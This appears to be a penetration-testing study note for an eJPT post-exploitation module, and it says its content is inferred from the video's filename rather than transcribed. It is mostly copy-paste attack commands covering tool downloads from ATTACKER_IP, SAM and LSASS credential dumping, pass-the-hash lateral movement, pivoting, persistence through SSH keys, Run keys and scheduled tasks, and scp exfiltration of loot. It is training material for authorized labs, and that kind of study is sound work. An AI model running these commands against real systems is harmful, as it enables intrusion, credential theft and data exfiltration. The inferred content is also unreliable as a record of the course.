# 01 – Introduction To Post-Exploitation (eJPT)

Note: No transcript was provided. The content below is a conservative, instructor-style summary inferred from the filename/context of an “Introduction to Post-Exploitation” video in an eJPT module. The commands are standard, copy-paste-friendly patterns commonly used in authorized labs and training.

Only perform these actions in labs or assessments where you have explicit authorization.


## What the video covers (Introduction / big picture)

- What post-exploitation is: actions after initial access to achieve objectives.
- Primary goals:
  - Stabilize and secure your access.
  - Enumerate the compromised host and internal network.
  - Escalate privileges where possible and permitted.
  - Harvest credentials and reuse them.
  - Move laterally/pivot to reach other targets.
  - Establish (authorized) persistence if in scope.
  - Collect evidence/loot, exfiltrate (if allowed), and clean up.
- Mindset and constraints:
  - Follow scope and rules of engagement (ROE).
  - Minimize impact and noise (OPSEC).
  - Prefer native tools first (LOLbins) before dropping binaries.
  - Document everything for reporting.


## Flow (ordered)

1. Stabilize your shell/session and set up quick file transfer.
2. Local host recon (OS, users, services, network, scheduled tasks, software).
3. Privilege escalation checks (misconfigs, SUID/Capabilities, services, patch levels).
4. Credential harvesting (files, memory, caches, managers, configuration).
5. Internal network recon (interfaces, routes, live hosts, shares).
6. Pivoting/tunneling to reach otherwise inaccessible subnets.
7. Lateral movement using harvested credentials.
8. Persistence (only if authorized).
9. Data collection/exfiltration (only what’s in scope).
10. Cleanup and documentation.


## Tools highlighted

- Native/built-in
  - Linux: bash/sh, python3, wget/curl, tar, ip/ss, systemctl, cron.
  - Windows CMD/PowerShell: whoami, systeminfo, net, sc, reg, wmic, schtasks, certutil, bitsadmin, Compress-Archive.
- Recon/Enum (commonly used in eJPT labs)
  - linPEAS, winPEAS, Seatbelt (Windows), PowerView (AD), BloodHound/SharpHound (AD).
- Credential access
  - Mimikatz (Windows), Impacket’s secretsdump.py, pypykatz, findstr/grep for config secrets.
- Lateral movement
  - Impacket (wmiexec.py, psexec.py, smbexec.py), CrackMapExec (CME), PsExec (Sysinternals).
- Pivoting/tunneling
  - SSH dynamic/local forwards, proxychains, chisel, socat/plink.
- Convenience
  - rlwrap, msfconsole/meterpreter (if allowed by ROE).


## Typical command walkthrough (detailed, copy-paste friendly)

Placeholders:
- ATTACKER_IP: your IP
- LPORT: your chosen port (e.g., 4444/8000/1080)
- TARGET_IP, PIVOT_IP: remote host addresses
- USER, PASS, DOMAIN: credentials if known

1) Prepare on the attacker box (simple web server, listener)
```
# Simple web server for tool transfer
python3 -m http.server 8000

# Nice Netcat listener with history
rlwrap -cAr nc -lvnp 4444
```

2) Stabilize a basic reverse shell (Linux victim)
```
# If you only have a dumb shell, upgrade it
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z to background, then on attacker:
stty raw -echo; fg
reset
stty rows 40 columns 120
```

3) Local enumeration – Linux
```
whoami && id && hostname -f
uname -a; cat /etc/os-release
ip -brief addr; ip route
ss -tulpn
ps auxww
env
sudo -l 2>/dev/null
ls -la /home /root 2>/dev/null
ls -la /var/backups /var/log 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null
systemctl list-timers --all 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
find / -writable -type d 2>/dev/null
dpkg -l 2>/dev/null | grep -Ei 'sudo|policykit|kernel|openssh'
grep -R -nEi 'password|secret|passwd|pwd|token|key' /var/www /opt /home 2>/dev/null
```

4) Local enumeration – Windows (CMD/PowerShell)
```
whoami /all
hostname && ver
systeminfo
wmic qfe get HotFixID,InstalledOn
ipconfig /all
route print
arp -a
net users
net localgroup administrators
net localgroup "Remote Desktop Users"
query user
net share
tasklist /v
sc query state= all | findstr /i "RUNNING"
wmic service get Name,StartName,State,PathName | findstr /i "mysql\|mssql\|tomcat\|apache\|pgsql"
wmic process get Name,CommandLine,ExecutablePath
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Hunt for credentials and configs
dir C:\ /a /s /b | findstr /i "backup .kdbx .config .ini .env id_rsa KeePass"
findstr /si /m "password= pwd= connectionString= secret key=" C:\*.txt C:\*.ini C:\*.config C:\inetpub\wwwroot\*.config C:\Users\*\AppData\Roaming\*.xml
```

5) Quick tool transfer (Windows)
```
# From victim (CMD):
certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\Windows\Temp\winPEASx64.exe

# Alternative (legacy, can be noisy):
bitsadmin /transfer job /download /priority normal http://ATTACKER_IP:8000/winPEASx64.exe C:\Windows\Temp\winPEASx64.exe
```

6) Run automated enum helpers (use only if allowed)
```
# Linux
curl -fsSL http://ATTACKER_IP:8000/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

# Windows (CMD)
C:\Windows\Temp\winPEASx64.exe
```

7) Privilege escalation checks – common quick wins

Linux:
```
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null
env | sort
echo $PATH
# Look for writable service files, scripts, or PATH hijack opportunities
```

Windows:
```
whoami /priv
# AlwaysInstallElevated?
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# UAC policy (informational)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
# Unquoted service paths / weak file permissions (use winPEAS/Seatbelt to speed this up)
```

8) Credential harvesting

Linux:
```
# App configs and keys
grep -R -nEi 'password|passwd|pwd|secret|token|key' /var/www /opt /home 2>/dev/null
ls -la ~/.ssh; cat ~/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
```

Windows:
```
# Offline SAM+SYSTEM dump (requires admin/system)
reg save HKLM\SAM C:\Windows\Temp\SAM.save
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save

# Transfer and dump with Impacket (attacker box)
secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL

# LSASS dump for later parsing (if permitted; beware EDR)
tasklist | findstr /i lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
# analyze with pypykatz on attacker
pypykatz lsa minidump lsass.dmp
```

9) Internal network recon (from compromised host)
```
# Linux
ip -brief addr; ip route
arp -an
# Quick sweep (if allowed)
for i in $(seq 1 254); do (ping -c1 -W1 10.0.2.$i >/dev/null && echo 10.0.2.$i) & done; wait

# Windows
ipconfig /all
route print
arp -a
for /L %i in (1,1,254) do @ping -n 1 -w 300 10.0.2.%i | find "TTL="
```

10) Pivoting/tunneling

SSH dynamic SOCKS proxy (if you have SSH access to PIVOT_IP):
```
ssh -i id_rsa -N -D 1080 user@PIVOT_IP
# On attacker, configure proxychains to use socks5 127.0.0.1 1080
proxychains -q nmap -Pn -sT -p 135,139,445 10.0.3.0/24
```

SSH local port forward (to reach a service via pivot):
```
ssh -i id_rsa -N -L 127.0.0.1:3389:10.0.3.10:3389 user@PIVOT_IP
# Now RDP to localhost
xfreerdp /u:USER /p:PASS /v:127.0.0.1
```

Chisel reverse SOCKS (when pivot cannot accept inbound):
```
# Attacker
chisel server --reverse -p 9001
# Victim/pivot
chisel client ATTACKER_IP:9001 R:1080:socks
# Use proxychains or ALL_PROXY to route through 127.0.0.1:1080
```

11) Lateral movement (examples)

Impacket:
```
# Pass-the-hash or password
wmiexec.py DOMAIN/USER@TARGET_IP
psexec.py DOMAIN/USER@TARGET_IP -hashes LMHASH:NTHASH
smbexec.py DOMAIN/USER@TARGET_IP -hashes LMHASH:NTHASH
```

CrackMapExec (quick checks):
```
crackmapexec smb 10.0.3.0/24 -u USER -p 'PASS' --shares
crackmapexec smb TARGET_IP -u USER -H NTHASH -x "whoami"
```

12) Persistence (only if explicitly allowed)

Linux:
```
# Add authorized key for persistence
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAA... attacker" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Windows:
```
# Startup persistence via Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Windows\Temp\agent.exe" /f

# Or scheduled task
schtasks /Create /SC ONLOGON /TN "Updater" /TR "C:\Windows\Temp\agent.exe" /RL HIGHEST /F
```

13) Data collection and exfiltration (respect scope)

Linux:
```
tar czf /tmp/loot.tgz /var/www/html /home 2>/dev/null
# exfil via scp (if allowed)
scp /tmp/loot.tgz user@ATTACKER_IP:/tmp/
```

Windows:
```
powershell -NoP -W Hidden -C "Compress-Archive -Path C:\inetpub\wwwroot -DestinationPath C:\Windows\Temp\loot.zip"
# Then transfer loot.zip via SMB/HTTP as permitted
```

14) Cleanup (always)
```
# Remove dropped tools, dumps, keys, tasks, services created during test
# Windows examples:
del C:\Windows\Temp\winPEASx64.exe
del C:\Windows\Temp\SAM.save C:\Windows\Temp\SYSTEM.save C:\Windows\Temp\lsass.dmp
schtasks /Delete /TN "Updater" /F
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /f

# Linux examples:
rm -f /tmp/linpeas.sh /tmp/loot.tgz
# Remove added SSH key if you created one for persistence
```


## Practical tips

- Confirm scope before persistence, password dumping, or lateral movement.
- Prefer native tools first; third-party binaries can trigger AV/EDR.
- Work from temp locations: Linux /tmp, Windows C:\Windows\Temp.
- Record exact commands and outcomes to accelerate reporting.
- Limit noisy scans; pivot + probe only what you need.
- Reuse credentials carefully; track where each set worked.
- Don’t clear logs unless the ROE explicitly allows it.
- Always clean up artifacts you introduced.


## Minimal cheat sheet (one-screen flow)

```
# Attacker prep
python3 -m http.server 8000
rlwrap -cAr nc -lvnp 4444

# Stabilize shell (Linux)
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm

# Linux enum
whoami; id; hostname -f; uname -a; cat /etc/os-release
ip -brief addr; ip route; ss -tulpn; ps auxww
sudo -l 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
grep -R -nEi 'password|secret|token|key' /var/www /opt /home 2>/dev/null

# Windows enum
whoami /all
systeminfo & wmic qfe get HotFixID,InstalledOn
ipconfig /all & route print & arp -a
net users & net localgroup administrators
tasklist /v
reg query HKLM\...\Run & reg query HKCU\...\Run
findstr /si /m "password= pwd= connectionString= secret key=" C:\*.txt C:\*.ini C:\*.config C:\inetpub\wwwroot\*.config

# Transfer tools to Windows
certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\Windows\Temp\winPEASx64.exe

# SAM/SYSTEM dump (Windows, admin)
reg save HKLM\SAM C:\Windows\Temp\SAM.save
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save
# Attacker: secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL

# Pivot via SSH SOCKS
ssh -i id_rsa -N -D 1080 user@PIVOT_IP
# proxychains ... through 127.0.0.1:1080

# Lateral movement (examples)
wmiexec.py DOMAIN/USER@TARGET_IP
psexec.py DOMAIN/USER@TARGET_IP -hashes LMHASH:NTHASH

# Cleanup
# Remove tools, dumps, tasks, registry entries you created
```


## Summary

This introductory post-exploitation module frames what you do after initial access: stabilize your foothold, enumerate the host and network, escalate privileges where allowed, harvest and reuse credentials, pivot to reach protected segments, optionally establish persistence, and collect evidence—while staying within scope and minimizing impact. Use native tooling first for OPSEC, drop helpers like PEAS only when needed, and document all actions to support clear, reproducible reporting.